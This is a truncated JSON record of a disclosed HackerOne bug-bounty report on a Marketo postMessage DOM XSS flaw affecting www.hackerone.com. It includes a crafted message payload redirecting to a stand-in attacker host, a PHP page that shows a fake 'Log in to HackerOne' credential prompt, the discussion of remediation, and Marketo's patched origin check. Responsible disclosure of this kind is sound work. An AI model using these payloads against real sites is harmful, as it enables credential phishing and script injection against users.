class=\"s2\"\u003emktoFormMessage0\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eerror\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003edata\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eformId\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e1013\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003efollowUpUrl\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehttps://attacker.sometld/401.php\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ealiId\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e17144124\u003c/span\u003e\u003cspan class=\"p\"\u003e}}}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe 401.php page should contain the following content, causing a basic authentication request to show:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;WWW-Authenticate: Basic realm=\u0026quot;Log in to HackerOne\u0026quot;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;HTTP/1.0 401 Unauthorized\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIn Firefox and Microsoft Edge, when the authentication prompt is shown the \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.hackerone.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e page is still visible in the background, making it possible that a user may not realise that the authentication prompt is related to a different application. I have attached a screenshot of this behaviour in Firefox.\u003c/p\u003e\n\n\u003cp\u003eIt should be noted that this could still be exploited in older versions of web browsers which do not support CSP (Chrome/Firefox ~2013 and earlier, for example). Additionally, if changes are made to the \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.hackerone.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e application which fix the functional issues, allowing the contact form to be used in IE11, this vulnerability could be immediately used to execute XSS against users of IE11.\u003c/p\u003e\n\n\u003cp\u003eTo fix this, Marketo should add a check in the listener which ensures that all messages received from another window were sent by a trusted origin. In my testing, I only saw messages sent from a subdomain of \u0026#39;marketo.com\u0026#39;, so I would suggest that they either whitelist the subdomains used to host their messaging iframes, or allow messages from all Marketo subdomains. The value of the followUpUrl property should also be validated, to ensure that it is a HTTP/HTTPS URL, to prevent redirection to to a JavaScript URI.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker could be able to execute JavaScript in the context of the \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.hackerone.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e application, if the victim user makes use of a browser which does not support CSP. The attacker could also perform a limited phishing attack in Firefox or Microsoft Edge.\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":63,"name":"Cross-site Scripting (XSS) - DOM"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":336412,"file_name":"postMessageXSS.html","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/336/412/9604e01f6464a99539482929af4c04405f26b7ea/postMessageXSS.html?response-content-disposition=attachment%3B%20filename%3D%22postMessageXSS.html%22%3B%20filename%2A%3DUTF-8%27%27postMessageXSS.html\u0026response-content-type=application%2Foctet-stream\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2QYQVMVU%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055103Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC3%2FsiyUovDMMRPwfmXSSMky3lQNd33wh1MrBmbWJC8HQIhAOSX92QvRr3Mllw0zHuI%2FUP9sF%2FDNWps6wYRKsfiEgbIKrQDCFEQARoMMDEzNjE5Mjc0ODQ5IgyayWzpgkc86ZJmRDMqkQNBHcx9TN8Qq3EOCDOHxZVSoo84ar5w931vjsPd%2BYQ3i%2Bx9eqo2ZtgVN1Jmoq8zs6hsL0mQ%2F20wJFKZixbR7HjPc8i4juMIQlnM8TPeS1SJgwLfpmO12sSyoWk3fn%2BevsZ74MOTjvipPhl7l4ysY7gvLSMb%2F%2FbZmlTb%2BRp9ew5nOoiXNI8oQZMkhOihsn1Q92Wzljmz7rLHf0SWhEVdMvtgNqYyJz%2FGfq5QgT7Ex9q0a8OeRuv2WivmkS0ItLzdLr4AZp8G9M8TS3hFKV7sBxW2jeQmBIgcwsfh6l5Kj2o1EeFByIjeAOeU8CtQvJjf1AYwsXig5iiWG1PDqO74ZMYim9a1AVJfIRMHELC9hgi%2BNRVkqsPBurY%2BhFIchB3A6MS0Fup9FcpwDiSPwMu92UsjrPwWcQSy7wF8W7uVHoWmYKo2Jie7uXX2WbkNvQn%2BVJkd%2ByJui6LuEsoOf46y4OUr9by1ZfOQEMvwaiEcDXAKt7msARgVRUaigRb1ZF8hYom2qPLbi%2BKKBIE%2FJ21mcK79gjDj36n%2FBTrqAbyLw6dOEWEdRc%2BQghV%2BGs0mxf6YcBEQ0xaDSLE5OQXQJX90aqhTYFzi15%2BtXM5rF%2FkTq%2FNonb0szkAGwKve9Fh2LyQ%2F7WBSh9XEjPVQ%2B94j5PqLLrVbqfO7RsbRpSefivNmepJrQv52y49fC1tTXoR893JVWe1bnDoXfPRtykz2CLE1WIUrJm7g0MwlQ4%2FYhjLC7FTb6WIejkEPZ0nJdYi90iaGNGoKuvlj2kpGsqCTPjBW8Vhu9R9qXAbPR%2Bj24hpsPhyGFzBe%2F1%2BqYcze%2B4BoEFO8hgcUAqm5L0zeqYMYIdqkfREAB0cTeQ%3D%3D\u0026X-Amz-Signature=64fd6166ac2bc3db3bbd8979be773339691df8f98d00ee70352a45d7faf83a08","file_size":706,"type":"text/html"},{"id":336413,"file_name":"firefox401.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/336/413/094bf86b073cdee88b8672f2ba523392a543fe69/firefox401.PNG?response-content-disposition=attachment%3B%20filename%3D%22firefox401.PNG%22%3B%20filename%2A%3DUTF-8%27%27firefox401.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2QYQVMVU%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055103Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC3%2FsiyUovDMMRPwfmXSSMky3lQNd33wh1MrBmbWJC8HQIhAOSX92QvRr3Mllw0zHuI%2FUP9sF%2FDNWps6wYRKsfiEgbIKrQDCFEQARoMMDEzNjE5Mjc0ODQ5IgyayWzpgkc86ZJmRDMqkQNBHcx9TN8Qq3EOCDOHxZVSoo84ar5w931vjsPd%2BYQ3i%2Bx9eqo2ZtgVN1Jmoq8zs6hsL0mQ%2F20wJFKZixbR7HjPc8i4juMIQlnM8TPeS1SJgwLfpmO12sSyoWk3fn%2BevsZ74MOTjvipPhl7l4ysY7gvLSMb%2F%2FbZmlTb%2BRp9ew5nOoiXNI8oQZMkhOihsn1Q92Wzljmz7rLHf0SWhEVdMvtgNqYyJz%2FGfq5QgT7Ex9q0a8OeRuv2WivmkS0ItLzdLr4AZp8G9M8TS3hFKV7sBxW2jeQmBIgcwsfh6l5Kj2o1EeFByIjeAOeU8CtQvJjf1AYwsXig5iiWG1PDqO74ZMYim9a1AVJfIRMHELC9hgi%2BNRVkqsPBurY%2BhFIchB3A6MS0Fup9FcpwDiSPwMu92UsjrPwWcQSy7wF8W7uVHoWmYKo2Jie7uXX2WbkNvQn%2BVJkd%2ByJui6LuEsoOf46y4OUr9by1ZfOQEMvwaiEcDXAKt7msARgVRUaigRb1ZF8hYom2qPLbi%2BKKBIE%2FJ21mcK79gjDj36n%2FBTrqAbyLw6dOEWEdRc%2BQghV%2BGs0mxf6YcBEQ0xaDSLE5OQXQJX90aqhTYFzi15%2BtXM5rF%2FkTq%2FNonb0szkAGwKve9Fh2LyQ%2F7WBSh9XEjPVQ%2B94j5PqLLrVbqfO7RsbRpSefivNmepJrQv52y49fC1tTXoR893JVWe1bnDoXfPRtykz2CLE1WIUrJm7g0MwlQ4%2FYhjLC7FTb6WIejkEPZ0nJdYi90iaGNGoKuvlj2kpGsqCTPjBW8Vhu9R9qXAbPR%2Bj24hpsPhyGFzBe%2F1%2BqYcze%2B4BoEFO8hgcUAqm5L0zeqYMYIdqkfREAB0cTeQ%3D%3D\u0026X-Amz-Signature=6b4ba5c614d6decebc87e3e94b41638423fa3c63b487862ad2cf9928b19b523f","file_size":72990,"type":"image/png"},{"id":336414,"file_name":"XSS2.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/336/414/3f93c2af6370c46e03e203615eb59e3cade0a046/XSS2.PNG?response-content-disposition=attachment%3B%20filename%3D%22XSS2.PNG%22%3B%20filename%2A%3DUTF-8%27%27XSS2.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2QYQVMVU%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055103Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC3%2FsiyUovDMMRPwfmXSSMky3lQNd33wh1MrBmbWJC8HQIhAOSX92QvRr3Mllw0zHuI%2FUP9sF%2FDNWps6wYRKsfiEgbIKrQDCFEQARoMMDEzNjE5Mjc0ODQ5IgyayWzpgkc86ZJmRDMqkQNBHcx9TN8Qq3EOCDOHxZVSoo84ar5w931vjsPd%2BYQ3i%2Bx9eqo2ZtgVN1Jmoq8zs6hsL0mQ%2F20wJFKZixbR7HjPc8i4juMIQlnM8TPeS1SJgwLfpmO12sSyoWk3fn%2BevsZ74MOTjvipPhl7l4ysY7gvLSMb%2F%2FbZmlTb%2BRp9ew5nOoiXNI8oQZMkhOihsn1Q92Wzljmz7rLHf0SWhEVdMvtgNqYyJz%2FGfq5QgT7Ex9q0a8OeRuv2WivmkS0ItLzdLr4AZp8G9M8TS3hFKV7sBxW2jeQmBIgcwsfh6l5Kj2o1EeFByIjeAOeU8CtQvJjf1AYwsXig5iiWG1PDqO74ZMYim9a1AVJfIRMHELC9hgi%2BNRVkqsPBurY%2BhFIchB3A6MS0Fup9FcpwDiSPwMu92UsjrPwWcQSy7wF8W7uVHoWmYKo2Jie7uXX2WbkNvQn%2BVJkd%2ByJui6LuEsoOf46y4OUr9by1ZfOQEMvwaiEcDXAKt7msARgVRUaigRb1ZF8hYom2qPLbi%2BKKBIE%2FJ21mcK79gjDj36n%2FBTrqAbyLw6dOEWEdRc%2BQghV%2BGs0mxf6YcBEQ0xaDSLE5OQXQJX90aqhTYFzi15%2BtXM5rF%2FkTq%2FNonb0szkAGwKve9Fh2LyQ%2F7WBSh9XEjPVQ%2B94j5PqLLrVbqfO7RsbRpSefivNmepJrQv52y49fC1tTXoR893JVWe1bnDoXfPRtykz2CLE1WIUrJm7g0MwlQ4%2FYhjLC7FTb6WIejkEPZ0nJdYi90iaGNGoKuvlj2kpGsqCTPjBW8Vhu9R9qXAbPR%2Bj24hpsPhyGFzBe%2F1%2BqYcze%2B4BoEFO8hgcUAqm5L0zeqYMYIdqkfREAB0cTeQ%3D%3D\u0026X-Amz-Signature=b2a38a7c52ebcd59cc830e2d2d67f0bb46d839f472967ebff5207e7314dfcae6","file_size":50119,"type":"image/png"}],"allow_singular_disclosure_at":"2019-01-27T14:37:49.843Z","allow_singular_disclosure_after":-60621193.930791214,"singular_disclosure_allowed":true,"vote_count":186,"voters":["13c50k4","sw33tlie","checkm50","hackerontwowheels","kapytein","zisec","spam404","base_64","mik317","sameerphad72","and 176 more..."],"severity":{"rating":"low","score":3.1,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"low","integrity":"none","availability":"none"}},"structured_scope":{"databaseId":6,"asset_type":"URL","asset_identifier":"https://www.hackerone.com","max_severity":"high"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3261133,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"@adac95 thanks for the report and really cool find and sorry for the delayed response. As you said, it looks best mitigated by Marketo, did you, by chance, reach out to their security team?","markdown_message":"\u003cp\u003e\u003ca href=\"/adac95\"\u003e@adac95\u003c/a\u003e thanks for the report and really cool find and sorry for the delayed response. As you said, it looks best mitigated by Marketo, did you, by chance, reach out to their security team?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-28T23:16:30.888Z","updated_at":"2018-08-28T23:16:30.888Z","actor":{"username":"bencode","cleared":false,"url":"/bencode","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/117/ddaa1da4e004e1234c6857c42f9bfa8df85b5ccf_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3262760,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hey,\n\nI haven't contacted Marketo's security team but I can if you need me to. I'm struggling to find the correct security contact though - https://www.marketo.com/security.php returns a 403.","markdown_message":"\u003cp\u003eHey,\u003c/p\u003e\n\n\u003cp\u003eI haven\u0026#39;t contacted Marketo\u0026#39;s security team but I can if you need me to. I\u0026#39;m struggling to find the correct security contact though - \u003ca title=\"https://www.marketo.com/security.php\" href=\"/redirect?url=https%3A%2F%2Fwww.marketo.com%2Fsecurity.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.marketo.com/security.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e returns a 403.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-29T08:12:50.361Z","updated_at":"2018-08-29T08:12:50.361Z","actor":{"username":"adac95","cleared":false,"url":"/adac95","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3286373,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@bencode Do you or anyone else at HackerOne have a security/support contact at Marketo that you can get in touch with? I can see that you have dealt with them directly in other bug reports and I think this may be a faster way to get the issue resolved.","markdown_message":"\u003cp\u003e\u003ca href=\"/bencode\"\u003e@bencode\u003c/a\u003e Do you or anyone else at HackerOne have a security/support contact at Marketo that you can get in touch with? I can see that you have dealt with them directly in other bug reports and I think this may be a faster way to get the issue resolved.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-03T18:41:33.965Z","updated_at":"2018-09-03T18:41:33.965Z","actor":{"username":"adac95","cleared":false,"url":"/adac95","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3287388,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@adac95 yeah let me see if we can get connected with those who've helped in the past, stand by!","markdown_message":"\u003cp\u003e\u003ca href=\"/adac95\"\u003e@adac95\u003c/a\u003e yeah let me see if we can get connected with those who\u0026#39;ve helped in the past, stand by!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-04T05:11:07.755Z","updated_at":"2018-09-04T05:11:07.755Z","actor":{"username":"bencode","cleared":false,"url":"/bencode","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/117/ddaa1da4e004e1234c6857c42f9bfa8df85b5ccf_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3299268,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I've filed a case with Marketo on this issue. Case Number #01159038.","markdown_message":"\u003cp\u003eI\u0026#39;ve filed a case with Marketo on this issue. Case Number \u003ca href=\"/reports/01159038\"\u003e#01159038\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-06T03:40:59.112Z","updated_at":"2018-09-06T03:40:59.112Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3302660,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"We'll triage this to keep an eye on it!","markdown_message":"\u003cp\u003eWe\u0026#39;ll triage this to keep an eye on it!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-06T18:15:14.182Z","updated_at":"2018-09-06T18:15:14.182Z","actor":{"username":"bencode","cleared":false,"url":"/bencode","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/117/ddaa1da4e004e1234c6857c42f9bfa8df85b5ccf_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3319852,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"From Marketo:\n\n\u003e Our product engineering team have reviewed the report and developed a fix which is slated for our 2018-Q4 release cycle. The tentatively planned date for 2018-Q4 being deployed is December 7th 2018. \n\nSo, looks like the fix should ship in 3 months? Disappointing that security updates take this long.","markdown_message":"\u003cp\u003eFrom Marketo:\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eOur product engineering team have reviewed the report and developed a fix which is slated for our 2018-Q4 release cycle. The tentatively planned date for 2018-Q4 being deployed is December 7th 2018. \u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eSo, looks like the fix should ship in 3 months? Disappointing that security updates take this long.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-11T07:51:46.283Z","updated_at":"2018-09-11T07:51:46.283Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3323505,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the update @reed. Three months is an extremely long time to implement two lines of JavaScript.\n\nI'll do some research and try to figure out if there is any way you can mitigate it from your side in the meantime, without breaking the contact form functionality. Although I have my doubts that it will be possible.","markdown_message":"\u003cp\u003eThanks for the update \u003ca href=\"/reed\"\u003e@reed\u003c/a\u003e. Three months is an extremely long time to implement two lines of JavaScript.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ll do some research and try to figure out if there is any way you can mitigate it from your side in the meantime, without breaking the contact form functionality. Although I have my doubts that it will be possible.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-11T19:15:23.022Z","updated_at":"2018-09-11T19:15:23.022Z","actor":{"username":"adac95","cleared":false,"url":"/adac95","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3338879,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-14T17:08:32.411Z","updated_at":"2018-09-14T17:08:32.411Z","additional_data":{"old_severity":"Low","new_severity":"Low (3.1)","old_severity_id":199629,"new_severity_id":210184},"actor":{"username":"pei","cleared":false,"url":"/pei","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/939/2d83322336a492279dc84d8f92f280c2d54fcb5b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3338884,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @adac95 - Thanks again for the thorough report! While stilling waiting for Marketo, we went ahead and awarded some bounties. \n\nHappy Friday!\nPei","markdown_message":"\u003cp\u003eHi \u003ca href=\"/adac95\"\u003e@adac95\u003c/a\u003e - Thanks again for the thorough report! While stilling waiting for Marketo, we went ahead and awarded some bounties. \u003c/p\u003e\n\n\u003cp\u003eHappy Friday!\u003cbr\u003e\nPei\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-14T17:09:33.537Z","updated_at":"2018-09-14T17:09:33.537Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"HackerOne"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"security","collaborator":{"username":"adac95","url":"/adac95"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3347284,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks all! I really appreciate it!\n\n@reed - I have been trying to think of ways to mitigate this issue but I don't think there is much that you can realistically do. The use of CSP is sufficient for the majority of users though. I would just keep in mind that, if modifications are made to the site to support IE11 before Marketo release their fix, users of this browser would be affected by the XSS.","markdown_message":"\u003cp\u003eThanks all! I really appreciate it!\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/reed\"\u003e@reed\u003c/a\u003e - I have been trying to think of ways to mitigate this issue but I don\u0026#39;t think there is much that you can realistically do. The use of CSP is sufficient for the majority of users though. I would just keep in mind that, if modifications are made to the site to support IE11 before Marketo release their fix, users of this browser would be affected by the XSS.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-17T09:34:07.166Z","updated_at":"2018-09-17T09:34:07.166Z","actor":{"username":"adac95","cleared":false,"url":"/adac95","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3791540,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @adac95 - as scheduled, we've just received a message from Marketo that they've pushed a fix for the security vulnerability! Thanks again for bringing this to our attention. Good luck and happy hacking!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/adac95\"\u003e@adac95\u003c/a\u003e - as scheduled, we\u0026#39;ve just received a message from Marketo that they\u0026#39;ve pushed a fix for the security vulnerability! Thanks again for bringing this to our attention. Good luck and happy hacking!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-08T23:31:38.589Z","updated_at":"2018-12-08T23:31:38.589Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"adac95","url":"/adac95"},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3835453,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @jobert\nI've just taken a very quick look at the fix and it seems reasonable to me. The onMessage function has been changed to the following:\n\n```javascript\nfunction onMessage (e){\n  // LM-116405: Forms2 iframeproxy may receive XSS message posted by other source\n  // To process the message ONLY IF its origin (protocol://host) matches iframeurl as prefix\n  if(e.originalEvent \u0026\u0026 e.originalEvent.data \u0026\u0026 iframeUrl.indexOf(e.originalEvent.origin) === 0){\n    var d;\n    try {\n      d = $.parseJSON(e.originalEvent.data);\n    }catch(ex){\n      return;\n    }\n    if(d.mktoReady){\n      onReady();\n    }else if(d.mktoResponse){\n      onResponse(d.mktoResponse)   \n    }\n  }\n}\n```\n\nThe iframeUrl is taken from the Marketo iframe element's action attribute and, in HackerOne's case, contains the value https://app-sj17.marketo.com/index.php/form/XDFrame. The if statement checks that origin of the message has an indexOf 0 within the iframeUrl.\n\nAs far as I can tell it shouldn't be possible to bypass this - only messages from the app-sj17.marketo.com origin will be accepted.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/jobert\"\u003e@jobert\u003c/a\u003e\u003cbr\u003e\nI\u0026#39;ve just taken a very quick look at the fix and it seems reasonable to me. The onMessage function has been changed to the following:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003eonMessage\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n  \u003cspan class=\"c1\"\u003e// LM-116405: Forms2 iframeproxy may receive XSS message posted by other source\u003c/span\u003e\n  \u003cspan class=\"c1\"\u003e// To process the message ONLY IF its origin (protocol://host) matches iframeurl as prefix\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eoriginalEvent\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan 